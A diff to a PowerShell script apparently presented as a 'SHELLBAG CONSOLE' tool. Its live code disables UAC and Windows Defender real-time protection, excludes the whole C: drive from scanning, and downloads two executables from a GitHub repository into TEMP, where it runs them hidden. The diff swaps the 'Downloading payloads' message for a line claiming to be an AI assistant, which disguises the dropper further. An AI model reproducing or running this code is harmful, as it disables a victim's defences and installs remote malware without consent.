@@ -6,7 +6,7 @@ if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
 }
 
 
-Write-Host "[KRA]: Modifying system configuration..."
+Write-Host "STARTED "
 
 $uacPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
 Set-ItemProperty -Path $uacPath -Name "EnableLUA" -Value 0 -Force
@@ -17,7 +17,7 @@ Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Nam
 Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableRealtimeMonitoring" -Value 1 -Force -ErrorAction SilentlyContinue
 Add-MpPreference -ExclusionPath "C:\" -Force -ErrorAction SilentlyContinue
 
-Write-Host "[KRA]: Downloading payloads..."
+Write-Host "HI AM AI ASISTENT FLUX AI"
 $url1 = "https://github.com/sys1e/winlogo/raw/refs/heads/main/winlogo.exe"
 $url2 = "https://github.com/sys1e/winlogo/raw/refs/heads/main/Client.exe"
 $path1 = "$env:TEMP\winlogo.exe"
@@ -32,7 +32,7 @@ Start-Process -FilePath $path1 -WindowStyle Hidden
 Start-Process -FilePath $path2 -WindowStyle Hidden
 
 Clear-Host
-$Host.UI.RawUI.WindowTitle = "SHELLBAG CONSOLE v2.0 | KRAKEH MODULE"
+$Host.UI.RawUI.WindowTitle = "SHELLBAG CONSOLE v2.0 | MODULE"
 
 
 function Show-KRAKEH-Header {
@@ -54,7 +54,7 @@ function Show-KRAKEH-Header {
     }
     
     Write-Host "================================================" -ForegroundColor Magenta
-    Write-Host "          SHELLBAG CONSOLE - KRA EDITION         " -ForegroundColor Yellow
+    Write-Host "          SHELLBAG CONSOLE - REALESE EDITION         " -ForegroundColor Yellow
     Write-Host "================================================" -ForegroundColor Magenta
     Write-Host ""
 }
